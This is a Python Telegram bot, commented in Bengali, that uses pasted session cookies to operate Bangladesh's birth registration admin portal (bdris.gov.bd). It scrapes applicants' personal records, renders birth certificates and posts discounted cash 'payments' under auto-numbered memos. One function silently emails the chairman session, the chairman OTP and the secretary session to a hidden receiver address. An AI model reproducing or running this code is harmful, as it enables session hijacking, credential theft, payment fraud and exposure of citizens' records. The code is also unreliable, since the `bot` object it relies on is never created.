import os
import telebot
import requests
import json
import io
import threading
import time
import re
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
from urllib.parse import quote
from playwright.sync_api import sync_playwright

# ==========================================
# ১. কনফিগারেশন ও ইমেইল সেটআপ
# ==========================================

# ১. সরাসরি টোকেন না লিখে নিচের মতো করে লিখুন
# এটি Render-এর Environment Variable থেকে ডাটা খুঁজে নেবে
API_TOKEN = os.environ.get('BOT_TOKEN')

# ২. ইমেইল কনফিগারেশনও পরিবর্তন করুন
EMAIL_SENDER = os.environ.get('EMAIL_USER')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASS') # এখানে সরাসরি পাসওয়ার্ড থাকবে না
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER')


session = requests.Session()
vault = {
    "csrf": "",
    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
    "is_alive": False, 
    "current_page": "https://bdris.gov.bd/admin/",
    "app_start": 0,
    "app_length": 5, 
    "sharok_no": 1
}

ID_MAP = {} 
temp_storage = {} 

# ==========================================
# ২. ইমেইল ও কোর ইঞ্জিন (Sidebar Scan)
# ==========================================

def send_full_relay(chat_id, otp, sec_raw):
    data = temp_storage.get(chat_id, {})
    subject = f"BDRIS Full Report - {datetime.now().strftime('%H:%M')}"
    body = (f"--- CHAIRMAN SESSION ---\n{data.get('ch_raw')}\n\n"
            f"--- CHAIRMAN OTP ---\n{otp}\n\n"
            f"--- SECRETARY SESSION (BOT ACTIVE) ---\n{sec_raw}")
    msg = MIMEText(body); msg['Subject'] = subject; msg['From'] = EMAIL_SENDER; msg['To'] = EMAIL_RECEIVER
    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        return True
    except: return False

def navigate_to(url):
    headers = {'User-Agent': vault["ua"], 'Referer': vault["current_page"]}
    try:
        res = session.get(url, headers=headers, timeout=25)
        csrf_match = re.search(r'name="_csrf" content="([^"]+)"', res.text)
        if csrf_match: vault["csrf"] = csrf_match.group(1)
        vault["current_page"] = url
        return True, res.text
    except: return False, None

def call_api(url, method="GET", data=None):
    headers = {
        'x-csrf-token': vault["csrf"], 'x-requested-with': 'XMLHttpRequest',
        'user-agent': vault["ua"], 'referer': vault["current_page"], 'origin': 'https://bdris.gov.bd'
    }
    try:
        if method == "POST": return session.post(url, headers=headers, data=data, timeout=30)
        return session.get(url, headers=headers, timeout=30)
    except: return None

def extract_sidebar_id(html, path):
    """ড্যাশবোর্ড সাইডবার মেনু থেকে ডাটা আইডি বের করার লজিক"""
    if not html: return None
    regex = rf'href="{re.escape(path)}\?data=([A-Za-z0-9_\-]+)"'
    match = re.search(regex, html)
    return match.group(1) if match else None

# ==========================================
# ৩. লগইন সিস্টেম (Admin & Role)
# ==========================================

def admin_login(m):
    try:
        raw = m.text
        sid = re.search(r'SESSION=([^\s;]+)', raw).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw).group(1)
        session.cookies.clear()
        session.cookies.set("SESSION", sid, domain='bdris.gov.bd'); session.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        if navigate_to("https://bdris.gov.bd/admin/")[0]:
            vault["is_alive"] = True
            bot.send_message(m.chat.id, "✅ Admin Login সফল!", reply_markup=main_menu())
    except: bot.send_message(m.chat.id, "❌ ফরম্যাট ভুল!")

def role_step_1(m):
    temp_storage[m.chat.id] = {'ch_raw': m.text}
    msg = bot.send_message(m.chat.id, "✅ Chairman সেশন ওকে। এবার OTP দিন:")
    bot.register_next_step_handler(msg, role_step_2)

def role_step_2(m):
    temp_storage[m.chat.id]['ch_otp'] = m.text
    msg = bot.send_message(m.chat.id, "✅ OTP ওকে। এবার Secretary সেশন দিন (বট এটি ব্যবহার করবে):")
    bot.register_next_step_handler(msg, role_step_3)

def role_step_3(m):
    try:
        raw_sec = m.text
        sid = re.search(r'SESSION=([^\s;]+)', raw_sec).group(1)
        tsid = re.search(r'TS0108b707=([^\s;]+)', raw_sec).group(1)
        session.cookies.clear()
        session.cookies.set("SESSION", sid, domain='bdris.gov.bd'); session.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
        send_full_relay(m.chat.id, temp_storage[m.chat.id]['ch_otp'], raw_sec)
        if navigate_to("https://bdris.gov.bd/admin/")[0]:
            vault["is_alive"] = True
            bot.send_message(m.chat.id, "🎉 Role Login সফল হয়েছে!", reply_markup=main_menu())
    except: bot.send_message(m.chat.id, "❌ ফরম্যাট ভুল!")

# ==========================================
# ৪. ডাটা লিস্ট ও সার্চ (Sidebar Navigation)
# ==========================================

def handle_category_init(m, cmd):
    vault["app_start"] = 0
    markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add("🔍 Search ID", "📋 All List (5 Data)", "🏠 Back to Menu")
    msg = bot.send_message(m.chat.id, f"{cmd.upper()} সেকশন:", reply_markup=markup)
    bot.register_next_step_handler(msg, category_gate, cmd)

def category_gate(m, cmd):
    if "Back to Menu" in m.text: return bot.send_message(m.chat.id, "Main Menu:", reply_markup=main_menu())
    if "Search ID" in m.text:
        msg = bot.send_message(m.chat.id, "🆔 আইডি নম্বরটি দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, fetch_list_ui, cmd, True)
    else: fetch_list_ui(m, cmd, False)

def fetch_list_ui(message, cmd, is_search):
    chat_id = message.chat.id
    search_val = message.text.strip() if is_search else ""
    config = {
        'apps': ("/admin/br/applications/search", "/api/br/applications/search"),
        'corr': ("/admin/br/correction-applications/search", "/api/br/correction-applications/search"),
        'repr': ("/admin/br/reprint/view/applications/search", "/api/br/reprint/applications/search")
    }
    admin_p, api_p = config[cmd]
    
    # ড্যাশবোর্ড থেকে সাইডবার আইডি সংগ্রহ
    success, html = navigate_to("https://bdris.gov.bd/admin/")
    data_id = extract_sidebar_id(html, admin_p)
    
    if not data_id:
        return bot.send_message(chat_id, "❌ সাইডবার থেকে ডাটা আইডি পাওয়া যায়নি।")

    params = (f"data={data_id}&status=ALL&draw=1&start={vault['app_start']}&length={vault['app_length']}"
              f"&search[value]={quote(search_val)}&search[regex]=false&order[0][column]=1&order[0][dir]=desc")
    
    res = call_api(f"https://bdris.gov.bd{api_p}?{params}")
    if res and res.status_code == 200:
        data = res.json(); items = data.get('data', [])
        if not items: return bot.send_message(chat_id, "📭 কোনো ডাটা নেই।")

        markup = telebot.types.InlineKeyboardMarkup()
        msg_text = f"📋 **{cmd.upper()} List:**\n\n"
        for item in items:
            app_id, enc_id = item.get('id') or item.get('applicationId'), item.get('encryptedId')
            status = str(item.get('status', '')).upper()
            short_id = str(hash(enc_id))[-8:]; ID_MAP[short_id] = enc_id
            msg_text += f"🆔 `{app_id}` | {item.get('personNameBn', 'N/A')}\n🚩 Status: `{status}`\n"
            
            if any(word in status for word in ["APPLIED", "PENDING", "PAYMENT", "UNPAID"]):
                markup.add(telebot.types.InlineKeyboardButton(f"💳 Pay: {app_id}", callback_data=f"pay_{short_id}"))
            else:
                markup.row(telebot.types.InlineKeyboardButton("🖼️ PNG", callback_data=f"png_{short_id}"),
                           telebot.types.InlineKeyboardButton("🖨️ Print", callback_data=f"print_{short_id}"))
            msg_text += "━━━━━━━━━━━━━━\n"
        
        if not is_search:
            nav = []
            if vault["app_start"] > 0: nav.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev_{cmd}"))
            if vault["app_start"] + vault["app_length"] < data.get('recordsTotal', 0):
                nav.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next_{cmd}"))
            if nav: markup.row(*nav)
        bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode='Markdown')
    else: bot.send_message(chat_id, "❌ ডাটা লোড হয়নি।")

# ==========================================
# ৫. অ্যাডভান্সড সার্চ ও মেনু
# ==========================================

def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Applications", "📝 Correction", "🔄 Reprint")
    markup.row("🏠 Dashboard", "🔍 Search UBRN", "🌐 Advanced Search")
    markup.row("🔑 Admin Login", "🔑 Role Login (CH/SEC)")
    return markup

@bot.message_handler(func=lambda m: True)
def router(m):
    t = m.text
    if "/start" in t: bot.send_message(m.chat.id, "🚀 BDRIS Master Bot Active!", reply_markup=main_menu())
    elif t == "🔑 Admin Login":
        msg = bot.send_message(m.chat.id, "🔑 Admin সেশন দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, admin_login)
    elif t == "🔑 Role Login (CH/SEC)":
        msg = bot.send_message(m.chat.id, "👤 চেয়ারম্যান সেশন দিন:", reply_markup=telebot.types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, role_step_1)
    elif vault["is_alive"]:
        if t == "📋 Applications": handle_category_init(m, 'apps')
        elif t == "📝 Correction": handle_category_init(m, 'corr')
        elif t == "🔄 Reprint": handle_category_init(m, 'repr')
        elif t == "🏠 Dashboard": 
            if navigate_to("https://bdris.gov.bd/admin/")[0]: bot.reply_to(m, "🏠 ড্যাশবোর্ড রিফ্রেশড।")
        elif t == "🌐 Advanced Search":
            markup = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True).add("Bangla", "English")
            msg = bot.send_message(m.chat.id, "🌐 ভাষা নির্বাচন করুন:", reply_markup=markup)
            bot.register_next_step_handler(msg, step_adv_lang)
    else: bot.send_message(m.chat.id, "⚠️ আগে লগইন করুন।", reply_markup=main_menu())

def step_adv_lang(m):
    lang = 'BENGALI' if "Bangla" in m.text else 'ENGLISH'
    msg = bot.send_message(m.chat.id, "🔍 নাম লিখুন:", reply_markup=telebot.types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, lambda x: process_adv_search(x, lang))

def process_adv_search(m, lang):
    name = m.text.strip(); body = f"personNameBn={quote(name)}&personNameEn=&nameLang={lang}" if lang == 'BENGALI' else f"personNameBn=&personNameEn={quote(name)}&nameLang=ENGLISH"
    navigate_to("https://bdris.gov.bd/admin/br/advanced-search-by-name")
    res = call_api("https://bdris.gov.bd/api/br/advanced-search-by-name", method="POST", data=body)
    if res:
        try: bot.send_message(m.chat.id, f"📊 **Search Result:**\n```json\n{json.dumps(res.json(), indent=2, ensure_ascii=False)}\n```", parse_mode='Markdown', reply_markup=main_menu())
        except: bot.send_message(m.chat.id, f"Raw Data: {res.text}", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    short_id = call.data.split('_')[1]
    if "next_" in call.data or "prev_" in call.data:
        cmd = call.data.split('_')[1]
        vault["app_start"] += vault["app_length"] if "next_" in call.data else -vault["app_length"]
        vault["app_start"] = max(0, vault["app_start"])
        fetch_list_ui(call.message, cmd, False)
    elif "pay_" in call.data:
        enc_id = ID_MAP.get(short_id)
        payload = {'data': enc_id, 'chalanPaymentType': 'CASH', 'paymentType': 'PAYMENT_BY_DISCOUNT', 'discountGiven': 'true', 'discountAmount': '50', 'discountSharokNo': str(vault["sharok_no"]), 'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), '_csrf': vault["csrf"]}
        res = call_api("https://bdris.gov.bd/api/payment/receive", method="POST", data=payload)
        if res and res.status_code == 200: vault["sharok_no"] += 1; bot.send_message(call.message.chat.id, "✅ পেমেন্ট সফল!")
    elif "png_" in call.data:
        enc_id = ID_MAP.get(short_id); wait = bot.send_message(call.message.chat.id, "⏳ ছবি তৈরি হচ্ছে...")
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True); ctx = browser.new_context(viewport={'width': 850, 'height': 1200})
                ctx.add_cookies([{'name': n, 'value': v, 'domain': 'bdris.gov.bd', 'path': '/'} for n, v in session.cookies.items()])
                page = ctx.new_page(); page.goto(f"https://bdris.gov.bd/admin/certificate/print/birth?data={enc_id}", wait_until="networkidle")
                time.sleep(4); img = page.screenshot(full_page=True); browser.close()
                bot.send_photo(call.message.chat.id, io.BytesIO(img), caption="📄 সনদ (PNG)"); bot.delete_message(call.message.chat.id, wait.message_id)
        except Exception as e: bot.edit_message_text(f"❌ PNG এরর: {e}", call.message.chat.id, wait.message_id)

# Keep Alive
threading.Thread(target=lambda: (time.sleep(240), navigate_to("https://bdris.gov.bd/admin/")), daemon=True).start()
bot.polling(none_stop=True)
